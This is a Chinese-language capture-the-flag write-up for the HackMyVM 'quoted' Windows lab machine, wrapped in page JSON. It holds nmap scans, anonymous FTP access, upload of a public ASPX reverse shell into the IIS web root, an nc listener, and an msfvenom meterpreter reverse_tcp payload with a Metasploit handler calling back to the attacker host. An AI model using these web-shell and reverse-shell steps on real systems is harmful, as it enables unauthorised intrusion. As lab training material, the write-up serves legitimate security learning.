{"pageProps":{"postData":{"id":"HackMyVMquoted","contentHtml":"<h1>quoted.</h1>\n<blockquote>\n<p><a href=\"https://hackmyvm.eu/machines/machine.php?vm=quoted\">https://hackmyvm.eu/machines/machine.php?vm=quoted</a></p>\n</blockquote>\n<h2>信息收集 &#x26; 扫描</h2>\n<pre><code class=\"hljs language-c\">nmap -sP <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.0</span>/<span class=\"hljs-number\">24</span>                             \nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2025-01-03 07:07 EST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.1</span>\nHost is up (<span class=\"hljs-number\">0.00043</span>s latency).\nMAC Address: <span class=\"hljs-number\">0</span>A:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">23</span> (Unknown)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.2</span>\nHost is up (<span class=\"hljs-number\">0.00036</span>s latency).\nMAC Address: <span class=\"hljs-number\">08</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-number\">07</span>:F6:<span class=\"hljs-number\">1B</span> (Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.6</span>\nHost is up (<span class=\"hljs-number\">0.00050</span>s latency).\nMAC Address: <span class=\"hljs-number\">08</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-number\">61</span>:C2:<span class=\"hljs-number\">6F</span> (Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.4</span>\n</code></pre>\n<pre><code class=\"hljs language-c\">nmap -sT -min-rate <span class=\"hljs-number\">10000</span> -p- <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.6</span>          \nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2025-01-03 07:14 EST</span>\nWarning: <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.6</span> giving up on port because retransmission cap hit (<span class=\"hljs-number\">10</span>).\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.6</span>\nHost is up (<span class=\"hljs-number\">0.00034</span>s latency).\nNot shown: <span class=\"hljs-number\">64843</span> closed tcp ports (conn-refused), <span class=\"hljs-number\">680</span> filtered tcp ports (no-response)\nPORT      STATE SERVICE\n<span class=\"hljs-number\">21</span>/tcp    open  ftp\n<span class=\"hljs-number\">80</span>/tcp    open  http\n<span class=\"hljs-number\">135</span>/tcp   open  msrpc\n<span class=\"hljs-number\">139</span>/tcp   open  netbios-ssn\n<span class=\"hljs-number\">445</span>/tcp   open  microsoft-ds\n<span class=\"hljs-number\">5357</span>/tcp  open  wsdapi\n<span class=\"hljs-number\">49152</span>/tcp open  unknown\n<span class=\"hljs-number\">49153</span>/tcp open  unknown\n<span class=\"hljs-number\">49154</span>/tcp open  unknown\n<span class=\"hljs-number\">49155</span>/tcp open  unknown\n<span class=\"hljs-number\">49156</span>/tcp open  unknown\n<span class=\"hljs-number\">49157</span>/tcp open  unknown\nMAC Address: <span class=\"hljs-number\">08</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-number\">61</span>:C2:<span class=\"hljs-number\">6F</span> (Oracle VirtualBox virtual NIC)\n</code></pre>\n<pre><code class=\"hljs language-c\">nmap -sT -sV -O -p <span class=\"hljs-number\">21</span>,<span class=\"hljs-number\">80</span>,<span class=\"hljs-number\">135</span>,<span class=\"hljs-number\">139</span>,<span class=\"hljs-number\">445</span>,<span class=\"hljs-number\">5357</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.6</span>\nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2025-01-03 07:15 EST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.6</span>\nHost is up (<span class=\"hljs-number\">0.00050</span>s latency).\n\nPORT     STATE SERVICE      VERSION\n<span class=\"hljs-number\">21</span>/tcp   open  ftp          Microsoft ftpd\n<span class=\"hljs-number\">80</span>/tcp   open  http         Microsoft IIS httpd <span class=\"hljs-number\">7.5</span>\n<span class=\"hljs-number\">135</span>/tcp  open  msrpc        Microsoft Windows RPC\n<span class=\"hljs-number\">139</span>/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn\n<span class=\"hljs-number\">445</span>/tcp  open  microsoft-ds Microsoft Windows <span class=\"hljs-number\">7</span> - <span class=\"hljs-number\">10</span> microsoft-ds (workgroup: WORKGROUP)\n<span class=\"hljs-number\">5357</span>/tcp open  http         Microsoft HTTPAPI httpd <span class=\"hljs-number\">2.0</span> (SSDP/UPnP)\nMAC Address: <span class=\"hljs-number\">08</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-number\">61</span>:C2:<span class=\"hljs-number\">6F</span> (Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least <span class=\"hljs-number\">1</span> open and <span class=\"hljs-number\">1</span> closed port\nDevice type: general purpose\nRunning: Microsoft Windows <span class=\"hljs-number\">7</span>|<span class=\"hljs-number\">2008</span>|<span class=\"hljs-number\">8.1</span>\nOS CPE: cpe:/o:microsoft:windows_7::- cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_server_2008::sp1 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_8.<span class=\"hljs-number\">1</span>\nOS details: Microsoft Windows <span class=\"hljs-number\">7</span> SP0 - SP1, Windows Server <span class=\"hljs-number\">2008</span> SP1, Windows Server <span class=\"hljs-number\">2008</span> R2, Windows <span class=\"hljs-number\">8</span>, or Windows <span class=\"hljs-number\">8.1</span> Update <span class=\"hljs-number\">1</span>\nNetwork Distance: <span class=\"hljs-number\">1</span> hop\nService Info: Host: QUOTED-PC; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nOS and Service detection performed. Please report any incorrect results at https:<span class=\"hljs-comment\">//nmap.org/submit/ .</span>\nNmap done: <span class=\"hljs-number\">1</span> IP address (<span class=\"hljs-number\">1</span> host up) scanned in <span class=\"hljs-number\">19.21</span> seconds\n</code></pre>\n<pre><code class=\"hljs language-c\">nmap -script=vuln -p <span class=\"hljs-number\">21</span>,<span class=\"hljs-number\">80</span>,<span class=\"hljs-number\">135</span>,<span class=\"hljs-number\">139</span>,<span class=\"hljs-number\">445</span>,<span class=\"hljs-number\">5357</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.6</span>                                                                                                                                                      \nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2025-01-03 07:17 EST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.6</span>                                                                        \nHost is up (<span class=\"hljs-number\">0.00056</span>s latency).\n                                                                                                         \nPORT     STATE SERVICE                                                                                   \n<span class=\"hljs-number\">21</span>/tcp   open  ftp\n<span class=\"hljs-number\">80</span>/tcp   open  http\n|_http-dombased-xss: Couldn<span class=\"hljs-string\">'t find any DOM based XSS.\n|_http-csrf: Couldn'</span>t find any CSRF vulnerabilities.                                                     \n|_http-stored-xss: Couldn<span class=\"hljs-string\">'t find any stored XSS vulnerabilities.                                                                                                                                                  \n135/tcp  open  msrpc                                                                                     \n139/tcp  open  netbios-ssn       \n445/tcp  open  microsoft-ds   \n5357/tcp open  wsdapi                               \nMAC Address: 08:00:27:61:C2:6F (Oracle VirtualBox virtual NIC)                                           \n                                                    \nHost script results:                               \n|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED     \n|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED                                                      \n|_smb-vuln-ms10-054: false                         \n</span></code></pre>\n<p>开放<code>445</code>，<code>135</code>端口可以尝试永恒之蓝，并且开放了<code>ftp</code> ，可以尝试使用匿名帐户来看看有没有敏感文件</p>\n<h2>渗透</h2>\n<p>首先看看ftp存在什么，然后使用<code>mget</code>将其全部拉出</p>\n<pre><code class=\"hljs language-c\">ftp <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.6</span>\nConnected to <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.6</span>.\n<span class=\"hljs-number\">220</span> Microsoft FTP Service\n<span class=\"hljs-title function_\">Name</span> <span class=\"hljs-params\">(<span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.6</span>:root)</span>: anonymous\n331 Anonymous access allowed, send <span class=\"hljs-title function_\">identity</span> <span class=\"hljs-params\">(e-mail name)</span> as password.\nPassword: \n230 User logged in.\nRemote system type is Windows_NT.\nftp> dir\n229 Entering Extended Passive <span class=\"hljs-title function_\">Mode</span> <span class=\"hljs-params\">(|||<span class=\"hljs-number\">49158</span>|)</span>\n125 Data connection already open; Transfer starting.\n<span class=\"hljs-number\">10</span><span class=\"hljs-number\">-05</span><span class=\"hljs-number\">-24</span>  <span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">16</span>AM       &#x3C;DIR>          aspnet_client\n<span class=\"hljs-number\">10</span><span class=\"hljs-number\">-04</span><span class=\"hljs-number\">-24</span>  <span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">27</span>PM                  <span class=\"hljs-number\">689</span> iisstart.htm\n<span class=\"hljs-number\">10</span><span class=\"hljs-number\">-04</span><span class=\"hljs-number\">-24</span>  <span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">27</span>PM               <span class=\"hljs-number\">184946</span> welcome.png\n<span class=\"hljs-number\">226</span> Transfer complete.\nftp> mget * \n</code></pre>\n<p>拉下来的文件其中图片打不开，<code>htm</code>文件像是<code>IIS</code>默认页面</p>\n<pre><code class=\"hljs language-c\">&#x3C;!DOCTYPE html PUBLIC <span class=\"hljs-string\">\"-//W3C//DTD XHTML 1.0 Strict//EN\"</span> <span class=\"hljs-string\">\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\"</span>>\n&#x3C;html xmlns=<span class=\"hljs-string\">\"http://www.w3.org/1999/xhtml\"</span>>\n&#x3C;head>\n&#x3C;meta http-equiv=<span class=\"hljs-string\">\"Content-Type\"</span> content=<span class=\"hljs-string\">\"text/html; charset=iso-8859-1\"</span> />\n&#x3C;title>IIS7&#x3C;/title>\n&#x3C;style type=<span class=\"hljs-string\">\"text/css\"</span>>\n&#x3C;!--\nbody {\n\tcolor:#<span class=\"hljs-number\">000000</span>;\n\tbackground-color:#B3B3B3;\n\tmargin:<span class=\"hljs-number\">0</span>;\n}\n\n<span class=\"hljs-meta\">#container {</span>\n\tmargin-left:<span class=\"hljs-keyword\">auto</span>;\n\tmargin-right:<span class=\"hljs-keyword\">auto</span>;\n\ttext-align:center;\n\t}\n\na img {\n\tborder:none;\n}\n\n-->\n&#x3C;/style>\n&#x3C;/head>\n&#x3C;body>\n&#x3C;div id=<span class=\"hljs-string\">\"container\"</span>>\n&#x3C;a href=<span class=\"hljs-string\">\"http://go.microsoft.com/fwlink/?linkid=66138&#x26;amp;clcid=0x409\"</span>>&#x3C;img src=<span class=\"hljs-string\">\"welcome.png\"</span> alt=<span class=\"hljs-string\">\"IIS7\"</span> width=<span class=\"hljs-string\">\"571\"</span> height=<span class=\"hljs-string\">\"411\"</span> />&#x3C;/a>\n&#x3C;/div>\n&#x3C;/body>\n&#x3C;/html>\n</code></pre>\n<p>实际上访问该靶机<code>80</code>端口也是该页面，可能FTP的文件夹就是网站根目录？</p>\n<p><img src=\"/post-images/HackMyVMquoted/image12.png\" alt=\"image.png\"></p>\n<p>尝试在<code>FTP</code>上传文件，意外的也成功了</p>\n<p><img src=\"/post-images/HackMyVMquoted/image13.png\" alt=\"image.png\"></p>\n<p>这下目标明确了，通过Wappalyzer可以知道使用的是ASP ，我们直接上传<code>asp</code>马</p>\n<blockquote>\n<p><a href=\"https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx\">https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx</a></p>\n</blockquote>\n<p>命名为4.aspx并上传</p>\n<pre><code class=\"hljs language-c\">ftp> put <span class=\"hljs-number\">4.</span>aspx\nlocal: <span class=\"hljs-number\">4.</span>aspx remote: <span class=\"hljs-number\">4.</span>aspx\n<span class=\"hljs-number\">229</span> Entering Extended Passive <span class=\"hljs-title function_\">Mode</span> <span class=\"hljs-params\">(|||<span class=\"hljs-number\">49159</span>|)</span>\n125 Data connection already open; Transfer starting.\n<span class=\"hljs-number\">100</span>% |*****************************************************************| <span class=\"hljs-number\">15971</span>       <span class=\"hljs-number\">13.53</span> MiB/s    --:-- ETA\n<span class=\"hljs-number\">226</span> Transfer complete.\n<span class=\"hljs-number\">15971</span> bytes sent in <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span> (<span class=\"hljs-number\">5.85</span> MiB/s)\n</code></pre>\n<p><code>nc</code>监听，然后<code>curl</code>上传的ASP马,成功反弹回来<code>shell</code></p>\n<pre><code class=\"hljs language-c\">nc -lvp <span class=\"hljs-number\">1234</span>                                            \nlistening on [any] <span class=\"hljs-number\">1234</span> ...\n<span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.6</span>: inverse host lookup failed: Unknown host\nconnect to [<span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.4</span>] from (UNKNOWN) [<span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.6</span>] <span class=\"hljs-number\">49160</span>\nSpawn Shell...\nMicrosoft Windows [Srm <span class=\"hljs-number\">6.1</span>.<span class=\"hljs-number\">7601</span>]\nTelif <span class=\"hljs-title function_\">Hakk</span> <span class=\"hljs-params\">(c)</span> 2009 Microsoft Corporation. Tm haklar sakldr.\n\nc:\\windows\\system32\\inetsrv>\n</code></pre>\n<p>首先读取用户的<code>flag</code></p>\n<pre><code class=\"hljs language-c\">c:\\Users\\quoted\\Desktop>type user.txt\ntype user.txt\nHMV{User_Flag_Obtained}\n</code></pre>\n<p><code>HMV{User_Flag_Obtained}</code></p>\n<p>尝试读取administrator用户<code>flag</code>但是提示无权限，因为靶机windows版本较老，我们将会话迁移到msf上</p>\n<p>首先创建反弹shell的文件</p>\n<pre><code class=\"hljs language-c\">msfvenom -p windows/meterpreter/reverse_tcp lport=<span class=\"hljs-number\">1235</span> lhost=<span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.4</span> -f exe > shell.exe\n</code></pre>\n<p>然后通过<code>ftp</code>上传，并且<code>msf</code>开启监听</p>\n<pre><code class=\"hljs language-c\">msf6 > use exploit/multi/handler \n[*] Using configured payload generic/shell_reverse_tcp\nmsf6 <span class=\"hljs-title function_\">exploit</span><span class=\"hljs-params\">(multi/handler)</span> > <span class=\"hljs-built_in\">set</span> payload windows/meterpreter/reverse_tcp\npayload => windows/meterpreter/reverse_tcp\nmsf6 <span class=\"hljs-title function_\">exploit</span><span class=\"hljs-params\">(multi/handler)</span> > <span class=\"hljs-built_in\">set</span> lport 1234\nlport => <span class=\"hljs-number\">1234</span>\nmsf6 <span class=\"hljs-title function_\">exploit</span><span class=\"hljs-params\">(multi/handler)</span> > <span class=\"hljs-built_in\">set</span> lhost 192.168.56.4\nlhost => <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.4</span>\nmsf6 <span class=\"hljs-title function_\">exploit</span><span class=\"hljs-params\">(multi/handler)</span> > run\n</code></pre>\n<p>执行上传的<code>exe</code>文件，这里不知道为什么我的靶机会出现说该程序不是windows程序无法执行😵</p>\n<p>root flag</p>\n<p><code>HMV{Elevated_Shell_Again}</code></p>","title":"HackMyVM - quoted","date":"2025-04-03","updated":"2025-04-03","comments":true,"tags":["HackMyVM","Linux靶机"],"categories":"靶机","description":"quoted.\n\n https://hackmyvm.eu/machines/machine.php?vm=quoted\n \n\n信息收集 & 扫描\n\n\n\n\n\n\n\n\n\n开放`445`，`135`端口可以尝试永恒之蓝，并且开放了`ftp` ，可以尝试使用匿名帐户来看看有没有敏感文件\n\n渗透\n\n首先看看ftp存在什么，然后使用`mget`将其全部拉出\n\n\n\n拉下来的文件其中图片打不开，`htm`文件像是..."},"recentPosts":[{"id":"HackTheBoxSeason9 - Expressway","title":"HackTheBox - Season9 - Expressway","date":"2025-09-21","isEncrypted":true,"year":"2025","month":"09","day":"21"},{"id":"HackTheBoxSeason8 - Fluffy","title":"HackTheBox - Machine - Fluffy","date":"2025-05-25","isEncrypted":false,"year":"2025","month":"09","day":"20"},{"id":"HackTheBoxMachine - Planning","title":"HackTheBox - Machine - Planning","date":"2025-05-11","isEncrypted":false,"year":"2025","month":"09","day":"20"},{"id":"HackTheBoxMachine - Eureka","title":"HackTheBox - Machine - Eureka","date":"2025-04-28","isEncrypted":false,"year":"2025","month":"09","day":"20"},{"id":"CyberstrikelabLab4","title":"Cyberstrikelab - Lab4","date":"2025-08-14","isEncrypted":false,"year":"2025","month":"08","day":"14"},{"id":"CyberstrikelabLab3","title":"Cyberstrikelab - Lab3","date":"2025-08-12","isEncrypted":false,"year":"2025","month":"08","day":"12"},{"id":"CyberstrikelabLab2","title":"Cyberstrikelab - Lab2","date":"2025-08-12","isEncrypted":false,"year":"2025","month":"08","day":"12"}]},"__N_SSG":true}